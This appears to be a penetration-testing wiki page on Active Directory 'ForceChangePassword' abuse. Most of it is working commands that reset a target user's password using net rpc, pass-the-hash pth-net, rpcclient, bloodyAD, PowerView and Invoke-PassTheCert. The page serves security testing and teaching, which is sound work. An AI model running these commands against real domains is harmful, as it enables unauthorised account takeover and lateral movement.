---
authors: CravateRouge, ShutdownRepo, sckdev, jamarir
category: ad
---

# ForceChangePassword

This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.

::: tabs

=== UNIX-like

It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](../ntlm/pth.md).

```bash
# With net and cleartext credentials (will be prompted)
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

# With net and cleartext credentials
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

# With Pass-the-Hash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package `samba-common-bin` is missing.

```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```


=== Windows

The attacker can change the password of the user. This can be achieved with [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.

Also, the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).

> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
```powershell
# Import the PowerShell script and show its manual
Import-Module .\Invoke-PassTheCert.ps1
.\Invoke-PassTheCert.ps1 -?
# Authenticate to LDAP/S
$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
# List all the available actions
Invoke-PassTheCert -a -NoBanner

# Updates the password of account 'Wordy WP. PRESS' to an empty string
Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword ''

# Updates the password of account 'Wordy WP. PRESS' to: NewP@ssw0rd123!
Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection $LdapConnection -Identity 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!'
```

:::
